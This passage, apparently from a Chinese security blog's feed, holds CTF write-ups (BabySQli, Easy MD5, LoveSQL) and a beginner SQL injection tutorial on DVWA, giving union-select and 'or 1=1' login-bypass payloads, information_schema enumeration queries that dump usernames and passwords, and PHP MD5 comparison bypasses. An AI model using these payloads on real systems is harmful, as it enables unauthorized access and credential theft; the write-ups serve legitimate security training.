1,2,3,4....%23</span><br></pre></td></tr></table></div></figure><p><img src="/2020/11/16/GXYCTF2019-BabySQli/2.1.png"></p><p><img src="/2020/11/16/GXYCTF2019-BabySQli/2.2.png"></p>        <h2 id="3-构造虚拟数据">          <a href="#3-构造虚拟数据" class="heading-link"><i class="fas fa-link"></i></a>3. 构造虚拟数据</h2>      <p>这里有3个字段，其实之前做的很多SQL注入的题目，经常可以看到id,username,password这样的字段，可以在这里猜测也是这样的字段</p><p>构建猜测payload：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;union select 1,&#39;admin&#39;,3%23</span><br></pre></td></tr></table></div></figure><p><img src="/2020/11/16/GXYCTF2019-BabySQli/3.0.png"></p><p>从结果显示的判断user在第二字段。</p><p> 接下里就是要绕过密码的md5验证，需要把我们输入的值和数据库里面存放的用户密码的md5值进行比较，那要怎么绕过呢？可以用联合查询语句用来生成虚拟的表数据（通常情况下数据库中的密码都是经过md5加密后的）</p>        <h3 id="3-1-构建虚拟数据原理">          <a href="#3-1-构建虚拟数据原理" class="heading-link"><i class="fas fa-link"></i></a>3.1 构建虚拟数据原理</h3>      <p>联合构建虚拟数据的原理就是原本没有某个用户的数据，但是在union联合查询这个不存在的数据，就会构建这个用户的数据信息，而这题正好是不知道admin的密码，所以就可以联合查询从而构建一个admin的数据，这样构建的虚拟admin的密码就是合法的（其实像这种情况，有可能有些情况下数据库下根本就没有设置密码，而我们正好构建一个虚拟合法密码数据）</p>        <h3 id="3-2-测试虚拟数据">          <a href="#3-2-测试虚拟数据" class="heading-link"><i class="fas fa-link"></i></a>3.2 测试虚拟数据</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">先构建一个用户haoye的密码123456经过md5加密后：e10adc3949ba59abbe56e057f20f883e</span><br><span class="line">构建虚拟用户payload：</span><br><span class="line">select * from users where user&#x3D;&#39;person&#39; union select 1,2,3,&#39;haoye&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;,6,7,8;</span><br></pre></td></tr></table></div></figure><p><img src="/2020/11/16/GXYCTF2019-BabySQli/3.2.1.png"></p><p><img src="/2020/11/16/GXYCTF2019-BabySQli/3.2.2.png"></p><p><img src="/2020/11/16/GXYCTF2019-BabySQli/3.2.3.png"></p><p>很明显，多了一个账户haoye，同时拥有密码</p>        <h3 id="3-3构建payload">          <a href="#3-3构建payload" class="heading-link"><i class="fas fa-link"></i></a>3.3构建payload</h3>      <p>payload：</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;1&#39;union select 1,&#39;admin&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;%23&amp;pw&#x3D;123456</span><br><span class="line">#这里的name&#x3D;1不能再为admin</span><br></pre></td></tr></table></div></figure><p><img src="/2020/11/16/GXYCTF2019-BabySQli/3.3.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[BJDCTF2020]Easy MD5</title>
      <link href="2020/11/16/BJDCTF2020-Easy-MD5/"/>
      <url>2020/11/16/BJDCTF2020-Easy-MD5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="BJDCTF2020-Easy-MD5">          <a href="#BJDCTF2020-Easy-MD5" class="heading-link"><i class="fas fa-link"></i></a>[BJDCTF2020]Easy MD5</h1>      <p><img src="/2020/11/16/BJDCTF2020-Easy-MD5/1.png"></p><a id="more"></a><p>页面很干净，随便输入值，没有反应，利用burp抓包</p><p><img src="/2020/11/16/BJDCTF2020-Easy-MD5/1.1.png"></p><p>看到有Hinit的提示，可以看出是md5+sql注入的方式，立刻想到<strong>ffifdyop</strong></p><p>可以参考：</p><p><a href="https://sculptor-liu.github.io/2020/08/27/MD5%E7%BB%95%E8%BF%87/">https://sculptor-liu.github.io/2020/08/27/MD5%E7%BB%95%E8%BF%87/</a></p><p>将<strong>ffifdyop</strong>提交查询，可以看到调转了页面</p><p><img src="/2020/11/16/BJDCTF2020-Easy-MD5/2.png"></p><p>可以看到源码中的提示</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a &#x3D; $GET[&#39;a&#39;];</span><br><span class="line">$b &#x3D; $_GET[&#39;b&#39;];</span><br><span class="line"></span><br><span class="line">if($a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b))&#123;</span><br><span class="line">    &#x2F;&#x2F; wow, glzjin wants a girl friend.</span><br><span class="line">--&gt;</span><br><span class="line">意思就是get方式传两个不同值的参数a和b，同时满足它们的md5值要相等</span><br></pre></td></tr></table></div></figure><p><strong>方法一：</strong></p><p>a=s1885207154a                b=s1836677006a</p><p>两个字符串的md5值返现的都是0e开头，在php中0e会被当做科学计数法，就算后面有字母，其结果也是0，所以上面的if判断结果使true，成功绕过！</p><p><img src="/2020/11/16/BJDCTF2020-Easy-MD5/3.png"></p><p><strong>方法二：</strong></p><p>数组绕过。原理是md5等函数不能处理数组，导致函数返回Null。而Null是等于Null的，导致了绕过。看下面的示例，是返回了yes的。（题目中就传入    ?a[]=1&amp;b[]=2    ）</p><p><img src="/2020/11/16/BJDCTF2020-Easy-MD5/4.png"></p><p>又来到一个新页面，这里和上面的不同就是用了===。这里就不存在上面的第一种绕过了，但是依然可以用第二种方法绕过，数组绕过param1[]=1&amp;param2[]=2</p><p><img src="/2020/11/16/BJDCTF2020-Easy-MD5/5.png"></p><p><img src="/2020/11/16/BJDCTF2020-Easy-MD5/6.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MD5 </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[极客大挑战 2019]LoveSQL</title>
      <link href="2020/10/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL/"/>
      <url>2020/10/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h2 id="1-首先判断是否有注入点">          <a href="#1-首先判断是否有注入点" class="heading-link"><i class="fas fa-link"></i></a>1.首先判断是否有注入点</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; or 1&#x3D;1#</span><br><span class="line">111</span><br></pre></td></tr></table></div></figure><a id="more"></a><p><img src="/2020/10/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL/1.1.png"></p><p><img src="/2020/10/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL/1.2.png"></p>        <h2 id="2-判断字段个数">          <a href="#2-判断字段个数" class="heading-link"><i class="fas fa-link"></i></a>2.判断字段个数</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;1&#39; order by 3%23&amp;password&#x3D;111</span><br><span class="line">?username&#x3D;1&#39; order by 4%23&amp;password&#x3D;111</span><br><span class="line">当by 4的时候报错显示字段长度不对，所以有3个字段</span><br><span class="line">%23是#通过url编码后的，有的地方设置了界限，比如说遇到#这个字符就会报错或者转换成别的，我们用url编码的目的就是用相同的意思而不被发现从而绕过规定的限制。</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL/2.1.jpg"></p><p><img src="/2020/10/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL/2.2.png"></p>        <h2 id="3-查找数据库">          <a href="#3-查找数据库" class="heading-link"><i class="fas fa-link"></i></a>3.查找数据库</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;1&#39; union select 1,2,group_concat(schema_name)from information_schema.schemata%23&amp;password&#x3D;111</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL/3.1.png"></p><p>可以看出有不止一个数据库，其实真正有效的只有test和geek，，其他的一般有经验的都知道那是服务器自带的</p>        <h2 id="4-查找数据表">          <a href="#4-查找数据表" class="heading-link"><i class="fas fa-link"></i></a>4.查找数据表</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;1&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;geek&#39;%23&amp;password&#x3D;111</span><br><span class="line">或者下面的，因为它有两个数据库</span><br><span class="line">?username&#x3D;1&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;test&#39;%23&amp;password&#x3D;111</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL/4.1.png"></p><p>有两个数据库 geek和test，所以我们都要试一下，可以看到在geek中有两个数据表</p>        <h2 id="5-查看数据结构">          <a href="#5-查看数据结构" class="heading-link"><i class="fas fa-link"></i></a>5.查看数据结构</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;1&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;geekuser&#39;%23&amp;password&#x3D;11</span><br><span class="line">或者</span><br><span class="line">?username&#x3D;1&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39;%23&amp;password&#x3D;111</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL/5.1.png"></p><p>l0ve1ysq1才有有效的东西</p>        <h2 id="6-查看数据结构里内容">          <a href="#6-查看数据结构里内容" class="heading-link"><i class="fas fa-link"></i></a>6.查看数据结构里内容</h2>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username&#x3D;1&#39; union select 1,2,group_concat(id,username,password)from l0ve1ysq1%23&amp;password&#x3D;111</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL/6.1.png"></p><p>F12查看网页源代码</p><p><img src="/2020/10/25/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL/6.2.png"></p><p>flag 到手</p>]]></content>
      
      
      <categories>
          
          <category> Web-CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入的入门</title>
      <link href="2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/"/>
      <url>2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="SQL注入的入门">          <a href="#SQL注入的入门" class="heading-link"><i class="fas fa-link"></i></a>SQL注入的入门</h1>      <p>参考：</p><p><span class="exturl"><a class="exturl__link" href="https://blog.csdn.net/weixin_45798017/article/details/105306095">https://blog.csdn.net/weixin_45798017/article/details/105306095</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><a href="https://sculptor-liu.github.io/2020/07/25/SQL%20%E6%B3%A8%E5%85%A5/">https://sculptor-liu.github.io/2020/07/25/SQL%20%E6%B3%A8%E5%85%A5/</a></p>        <h3 id="服务器以及其内部关系">          <a href="#服务器以及其内部关系" class="heading-link"><i class="fas fa-link"></i></a>服务器以及其内部关系</h3>      <p>一个服务器上有多个数据库，同时有着存放所有数据库的库，存放所有数据表的库，存放所有数据结构的库</p><a id="more"></a><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/0.0.1.png"></p><p>对于一个数据库来说，一个数据库中可能存放多个数据表，一张表上有多个变量，例如长宽高，这个就是这个表的数据结构，而数据结构所对应的值就是数据内容，通常flag就在这个变量里。</p><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/0.0.2.png"></p>        <h2 id="1-SQL的基本命令">          <a href="#1-SQL的基本命令" class="heading-link"><i class="fas fa-link"></i></a>1.SQL的基本命令</h2>      <p><strong>首先</strong>，进入mysql命令行</p><p><strong>新版的</strong></p><p>进入mysql的bin的存放路径-&gt;cmd</p><p>命令:</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -proot            &#x2F;&#x2F;-u是账户名，-p是密码    都是root</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/0.1.png"></p><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/0.2.png"></p><p><strong>老版的：</strong></p><p>其他选项菜单-&gt;mysql工具-&gt;mysql命令行</p><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/0.3.png"></p>        <h3 id="1-1-查找数据库">          <a href="#1-1-查找数据库" class="heading-link"><i class="fas fa-link"></i></a>1.1 查找数据库</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/1.1.png"></p>        <h3 id="1-2-使用数据库">          <a href="#1-2-使用数据库" class="heading-link"><i class="fas fa-link"></i></a>1.2 使用数据库</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use dvwa;   &#x2F;&#x2F;当没有使用数据库时是无法访问该数据库下面的数据的</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/1.2.png"></p>        <h3 id="1-3-查找数据表">          <a href="#1-3-查找数据表" class="heading-link"><i class="fas fa-link"></i></a>1.3 查找数据表</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show tables;</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/1.3.png"></p>        <h3 id="1-4-查询数据结构">          <a href="#1-4-查询数据结构" class="heading-link"><i class="fas fa-link"></i></a>1.4 查询数据结构</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">desc users;</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/1.4.png"></p>        <h3 id="1-5-创建新的数据库">          <a href="#1-5-创建新的数据库" class="heading-link"><i class="fas fa-link"></i></a>1.5 创建新的数据库</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database haoye;</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/1.5.png"></p>        <h3 id="1-6-删除数据库">          <a href="#1-6-删除数据库" class="heading-link"><i class="fas fa-link"></i></a>1.6 删除数据库</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop database haoye;</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/1.6.png"></p>        <h3 id="1-7-从数据表中查找所有数据">          <a href="#1-7-从数据表中查找所有数据" class="heading-link"><i class="fas fa-link"></i></a>1.7 从数据表中查找所有数据</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users;    &#x2F;&#x2F;*是所有的意思，users是上面dvwa数据库下面的一个数据表</span><br><span class="line">这样查询可以把users这个数据表中所有的数据结构以及它所对于的值（数据）全部爆出来</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/1.7.1.png"></p>        <h3 id="1-8-or的注入原理">          <a href="#1-8-or的注入原理" class="heading-link"><i class="fas fa-link"></i></a>1.8 or的注入原理</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select user,password,last_name from users where user&#x3D;&#39;haoye&#39; or 1&#x3D;1;</span><br><span class="line">&#x2F;&#x2F;意思是从users这个数据表中搜索一个user是haoye所以对应的user，paswword,last_name的数据；然而，其实并没有一个叫haoye的user，但是由于我们后面加了一个1&#x3D;1的必然成立事件，所以无论前面的语句是否为真，这整条语句都是合法的，所以就会把users这个数据表下需要查找的3个数据结构的所有数据全部爆出来。</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/1.8.1.png"></p>        <h2 id="2-基本函数">          <a href="#2-基本函数" class="heading-link"><i class="fas fa-link"></i></a>2.基本函数</h2>              <h3 id="2-1-版本">          <a href="#2-1-版本" class="heading-link"><i class="fas fa-link"></i></a>2.1 版本</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">version（）</span><br></pre></td></tr></table></div></figure>        <h3 id="2-2-数据库">          <a href="#2-2-数据库" class="heading-link"><i class="fas fa-link"></i></a>2.2 数据库</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">database（）</span><br></pre></td></tr></table></div></figure>        <h3 id="2-3-数据表">          <a href="#2-3-数据表" class="heading-link"><i class="fas fa-link"></i></a>2.3 数据表</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table（）</span><br></pre></td></tr></table></div></figure>        <h2 id="3-基于information-schema">          <a href="#3-基于information-schema" class="heading-link"><i class="fas fa-link"></i></a>3.基于information_schema</h2>              <h3 id="3-1-总的数据库">          <a href="#3-1-总的数据库" class="heading-link"><i class="fas fa-link"></i></a>3.1 总的数据库</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema.schemata</span><br></pre></td></tr></table></div></figure>        <h3 id="3-2-数据库的库">          <a href="#3-2-数据库的库" class="heading-link"><i class="fas fa-link"></i></a>3.2 数据库的库</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema.schema</span><br></pre></td></tr></table></div></figure>        <h3 id="3-3-数据表的库">          <a href="#3-3-数据表的库" class="heading-link"><i class="fas fa-link"></i></a>3.3 数据表的库</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema.tables</span><br></pre></td></tr></table></div></figure>        <h3 id="3-4-数据结构的库">          <a href="#3-4-数据结构的库" class="heading-link"><i class="fas fa-link"></i></a>3.4 数据结构的库</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema.columns</span><br></pre></td></tr></table></div></figure>        <h4 id="数据库">          <a href="#数据库" class="heading-link"><i class="fas fa-link"></i></a>数据库</h4>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table_schema</span><br></pre></td></tr></table></div></figure>        <h4 id="数据表">          <a href="#数据表" class="heading-link"><i class="fas fa-link"></i></a>数据表</h4>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table_name</span><br></pre></td></tr></table></div></figure>        <h4 id="数据结构">          <a href="#数据结构" class="heading-link"><i class="fas fa-link"></i></a>数据结构</h4>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">column_name</span><br></pre></td></tr></table></div></figure>        <h2 id="4-常用函数">          <a href="#4-常用函数" class="heading-link"><i class="fas fa-link"></i></a>4.常用函数</h2>              <h3 id="4-1-group-concat">          <a href="#4-1-group-concat" class="heading-link"><i class="fas fa-link"></i></a>4.1 group_concat()</h3>      <p>利用 group_concat()函数可以得到所有库名，或者同一库名下的所有表名，省去了一个个的麻烦</p><p>函数里面加 schema_name,table_name,column_name 就可以了</p><p>同时，利用 union select group_concat(字段名) from (库名.表名) 可以得到字段内容</p><p>比如说，当原本网站后台源码只查询2个字段，然而我们想要3个数据，我们就可以这样查询、</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 数据1，group_concat(数据2，数据2) from  &#x2F;&#x2F;这里就相当于数据1占据了一个位置，数据2和数据3占据同一个位置</span><br><span class="line">或者 select 1，group_concat(数据1，数据2，数据3)  from      &#x2F;&#x2F;这里select后面的的1只是一个随便代称，可以是随便的数字，为了占据一个位置，而后面3个数据占据同一个位置</span><br></pre></td></tr></table></div></figure>        <h2 id="5-常用注入语句">          <a href="#5-常用注入语句" class="heading-link"><i class="fas fa-link"></i></a>5.常用注入语句</h2>              <h3 id="5-1-万能头">          <a href="#5-1-万能头" class="heading-link"><i class="fas fa-link"></i></a>5.1 万能头</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1#                #是注释符号</span><br></pre></td></tr></table></div></figure>        <h3 id="5-2-查询字段长度">          <a href="#5-2-查询字段长度" class="heading-link"><i class="fas fa-link"></i></a>5.2 查询字段长度</h3>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39; order by 1&#x2F;2&#x2F;3...#</span><br><span class="line">或者 1&#39; union select 1，2，3...   &#x2F;&#x2F;1,2,3就相当于下面的注入数据，当超过后端源码固定查找的字段个数时就会报错</span><br><span class="line">当页面返回 Unknown column &#39;3&#39; in &#39;order clause&#39;的类似字样时则，3前面的2是正确字段长度</span><br></pre></td></tr></table></div></figure><p>为什么要知道字段长度，因为对于后端源码来说，执行的是select+要查找的数据，格式大概为select 数据1，数据2，数据3…,，所以我们在进行注入时就要符合后端源码的格式，后端是要查找几个字段，我们在注入时候就要select几个字段；例如，下面这个源码显示，可以看出该后台源码查找的只有两个字段，所以我们当order by 3的时候报错</p><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/5.2.1.png"></p>        <h3 id="5-3-union-select联合查询">          <a href="#5-3-union-select联合查询" class="heading-link"><i class="fas fa-link"></i></a>5.3 union select联合查询</h3>      <p>union 操作符用于合并两个或者多个 SQL 语句集合起来，得到联合的查询结果</p>        <h2 id="6-实例">          <a href="#6-实例" class="heading-link"><i class="fas fa-link"></i></a>6.实例</h2>      <p>靶机：DVWA</p>        <h3 id="low级别">          <a href="#low级别" class="heading-link"><i class="fas fa-link"></i></a>low级别</h3>              <h4 id="6-1-1-查看字段">          <a href="#6-1-1-查看字段" class="heading-link"><i class="fas fa-link"></i></a>6.1.1 查看字段</h4>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; order by 1&#x2F;2&#x2F;3...#</span><br></pre></td></tr></table></div></figure>        <h4 id="6-1-2-查看数据库">          <a href="#6-1-2-查看数据库" class="heading-link"><i class="fas fa-link"></i></a>6.1.2 查看数据库</h4>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,database()#           </span><br><span class="line">select后面的1是为了占据一个位置；database()函数只能查询到当前页面的数据库</span><br></pre></td></tr></table></div></figure><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,group_concat(schema_name)from information_schema.schemata#</span><br><span class="line">查询整个服务器上所有的数据库</span><br><span class="line">&#x2F;&#x2F;意思是从一个总库（服务器上库的集合）中查询所有的数据库</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/6.1.2.png"></p>        <h4 id="6-1-3-查看数据表">          <a href="#6-1-3-查看数据表" class="heading-link"><i class="fas fa-link"></i></a>6.1.3 查看数据表</h4>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&quot;dvwa&quot;#</span><br><span class="line">&#x2F;&#x2F;从一个数据表总库中查询所有的数据表，条件是要求这些数据表所在的数据库名为dvwa</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/6.1.3.png"></p>        <h4 id="6-1-4-查看数据结构">          <a href="#6-1-4-查看数据结构" class="heading-link"><i class="fas fa-link"></i></a>6.1.4 查看数据结构</h4>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,group_concat(column_name)from information_schema.columns where table_name&#x3D;&quot;users&quot;#</span><br><span class="line">&#x2F;&#x2F;从数据结构总库中查询所有的数据结构，要求这些数据结构所在的数据表为users</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/6.1.4.png"></p>        <h4 id="6-1-5-查看数据结构中的内容">          <a href="#6-1-5-查看数据结构中的内容" class="heading-link"><i class="fas fa-link"></i></a>6.1.5 查看数据结构中的内容</h4>      <figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select 1,group_concat(user)from dvwa.users#</span><br><span class="line">dvwa.users就是数据库下的数据表</span><br><span class="line">&#x2F;&#x2F;从名叫dvwa数据库下的users这个数据表中搜索所有的user数据</span><br></pre></td></tr></table></div></figure><p><img src="/2020/10/25/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%85%A5%E9%97%A8/6.1.5.png"></p>        <h2 id="7-题目">          <a href="#7-题目" class="heading-link"><i class="fas fa-link"></i></a>7.题目</h2>      <p>BUUCTF</p><p><span class="exturl"><a class="exturl__link" href="https://buuoj.cn/">https://buuoj.cn/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="7-1-题目一">          <a href="#7-1-题目一" class="heading-link"><i class="fas fa-link"></i></a>7.1 题目一</h3>      <p><span class="exturl"><a class="exturl__link" 